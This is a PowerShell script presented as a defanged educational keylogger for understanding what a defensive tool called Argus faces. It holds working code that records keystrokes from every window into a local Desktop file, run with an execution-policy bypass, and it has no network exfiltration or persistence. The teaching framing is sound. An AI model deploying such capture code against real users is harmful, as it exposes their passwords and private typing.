# keylogger-demo.ps1
# DEFANGED educational keylogger — for understanding what Argus is up against.
#
# WHAT IT DOES:
#   Captures keystrokes SYSTEM-WIDE (every window, not just this one) and appends
#   them to a plain-text file on YOUR Desktop. LOCAL ONLY — no network, no
#   persistence, no stealth. Stops when you press ESC, or Ctrl+C this window.
#
# WHY IT'S HARMLESS HERE:
#   Everything it captures stays in Desktop\keylog.txt on your own machine. A real
#   keylogger ADDS exfiltration (stage 4) and persistence (stage 2) — this has
#   neither. It also logs in plain sight: no -enc, no -w hidden.
#
# RUN:   powershell -ExecutionPolicy Bypass -File keylogger-demo.ps1
# STOP:  press ESC (or Ctrl+C in this window)

$log = Join-Path $env:USERPROFILE 'Desktop\keylog.txt'

$banner = "=== KEYLOGGER DEMO === started $(Get-Date)  pid=$PID`nType in ANY window (try Notepad). Press ESC to stop.`n"
$banner | Out-File -LiteralPath $log -Encoding utf8
Write-Host $banner

Add-Type -Name Win32 -Namespace API -MemberDefinition '[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);' -PassThru | Out-Null

# Keys we skip so the log stays readable (Shift/Ctrl/Alt/Win/Caps)
$skip = 0x10, 0x11, 0x12, 0x14, 0x5B, 0x5C, 0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5

# Readable forms for the specials
$special = @{ 0x08 = '[BACKSPACE]'; 0x09 = '[TAB]'; 0x0D = "`n"; 0x1B = '[ESC]'; 0x20 = ' ' }

while ($true) {
    Start-Sleep -Milliseconds 40
    for ($i = 8; $i -le 190; $i++) {
        if ($skip -contains $i) { continue }
        if ([API.Win32]::GetAsyncKeyState($i) -eq -32767) {   # freshly pressed (not held)
            if ($i -eq 0x1B) {
                "`n=== stopped by ESC $(Get-Date) ===" | Add-Content -LiteralPath $log -Encoding utf8
                Write-Host "`nStopped. Log is at: $log"
                exit
            }
            if ($special.ContainsKey($i)) { $ch = $special[$i] }
            elseif ($i -ge 0x30 -and $i -le 0x39) { $ch = [char]$i }            # 0-9
            elseif ($i -ge 0x41 -and $i -le 0x5A) { $ch = [char]$i }            # A-Z (logged uppercase; shift-tracking omitted)
            elseif ($i -ge 0x60 -and $i -le 0x69) { $ch = [string]($i - 0x60) } # numpad 0-9
            else { $ch = "[[$i]]" }
            Add-Content -LiteralPath $log -Value $ch -NoNewline -Encoding utf8
        }
    }
}
